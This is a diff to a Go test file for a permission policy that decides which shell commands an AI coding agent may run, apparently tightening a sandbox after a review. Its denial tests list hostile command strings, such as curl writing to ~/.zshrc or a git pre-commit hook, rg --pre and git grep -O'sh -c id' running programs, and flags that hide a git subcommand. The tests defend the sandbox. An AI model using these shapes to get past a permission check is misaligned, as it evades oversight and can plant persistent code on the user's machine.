@@ -21,7 +21,7 @@ func companionPolicy(t *testing.T) (p *PermissionPolicy, companion, elsewhere st
 		}
 	}
 	p.ReadAlso = []string{companion}
-	p.BashAllow = []string{"rg *", "grep *", "find *", "ls *", "git log*", "git show*", "head *", "wc *", "sort *", "go test*", "wget *", "curl *", "awk *", "tar *", "cp *", "openssl *", "git difftool*"}
+	p.BashAllow = []string{"rg *", "grep *", "find *", "ls *", "git log*", "git show*", "head *", "wc *", "sort *", "go test*", "wget *", "curl *", "awk *", "tar *", "cp *", "openssl *", "git difftool*", "cut *", "git grep*"}
 	return p, companion, elsewhere
 }
 
@@ -52,6 +52,10 @@ func TestReadOnlyBashReachesACompanionRepository(t *testing.T) {
 		"grep -rn root -- " + filepath.Join(companion, "src"),
 		"head -n 40 " + filepath.Join(companion, "src", "app.html"),
 		"git -C " + companion + " log -5 --format=%h -- src",
+		// A delimiter or a pattern is not a path, attached or not.
+		"cut -d/ -f2 " + filepath.Join(companion, "src", "app.html"),
+		"git -C " + companion + " log -S/api/v1 --oneline",
+		"rg -e/api/v1 " + filepath.Join(companion, "src"),
 	} {
 		if d := p.Decide("Bash", bashInput(c)); !d.Allow {
 			t.Errorf("refused %q: %s", c, d.Message)
@@ -103,6 +107,16 @@ func TestBashStillStopsAtTheReadScope(t *testing.T) {
 		"sort -o~/x y",
 		"curl -o/etc/x https://example.com/x",
 		"rg --pre " + filepath.Join(companion, "x.sh") + " x",
+		// The second 58140b9 review: "--" can be a flag's value, a git
+		// global flag can hide the subcommand, a value can sit at the end of
+		// a flag cluster, and rg and git grep can run a program.
+		"curl -H -- -o " + filepath.Join(companion, ".git", "config") + " https://example.com/x",
+		"rg -e -- --pre " + filepath.Join(companion, "evil.sh") + " x",
+		"sort -ro/tmp/x y",
+		"curl -sSo~/.zshrc https://example.com/x",
+		"rg --hostname-bin " + filepath.Join(companion, "evil.sh") + " x",
+		"git grep -O'sh -c id' foo",
+		"git grep --open-files-in-pager='sh -c id' foo",
 	} {
 		if d := p.Decide("Bash", bashInput(c)); d.Allow {
 			t.Errorf("allowed %q", c)
@@ -117,5 +131,43 @@ func TestFixBashStaysInTheWorktree(t *testing.T) {
 		if d := p.Decide("Bash", bashInput(c)); d.Allow {
 			t.Errorf("fix run allowed %q", c)
 		}
+	}
+}
+
+// A fix run has no read scope, so nothing it names outside the worktree is
+// relaxed; these are the shapes the "--" and cluster handling must not open
+// inside it either.
+func TestFixBashStillJudgesFlagValues(t *testing.T) {
+	p, _, _ := companionPolicy(t)
+	p.Mode = ModeFix
+	p.BashAllow = []string{"curl *", "go test*", "sort *", "gcc *", "go build*"}
+	for _, c := range []string{
+		"curl -H -- -o .git/hooks/pre-commit https://example.com/x",
+		"go test -run -- -coverprofile .git/hooks/pre-commit ./...",
+		"sort -ro.git/hooks/pre-commit x",
+	} {
+		if d := p.Decide("Bash", bashInput(c)); d.Allow {
+			t.Errorf("fix run allowed %q", c)
+		}
+	}
+	for _, c := range []string{
+		"gcc -I/usr/include -c x.c",
+		"go build -ldflags '-X main.version=1.2' ./...",
+		"go test -run TestX/sub ./...",
+	} {
+		if d := p.Decide("Bash", bashInput(c)); !d.Allow {
+			t.Errorf("fix run refused %q: %s", c, d.Message)
+		}
+	}
+}
+
+// readsOnly finds the subcommand git runs, not the first bare word: a
+// global flag with a value of its own can put a reader's name there.
+func TestGitGlobalFlagDoesNotHideTheSubcommand(t *testing.T) {
+	p, companion, _ := companionPolicy(t)
+	p.BashAllow = []string{"git *"}
+	c := "git --namespace log difftool -y -x " + filepath.Join(companion, "evil.sh")
+	if d := p.Decide("Bash", bashInput(c)); d.Allow {
+		t.Errorf("allowed %q", c)
 	}
 }
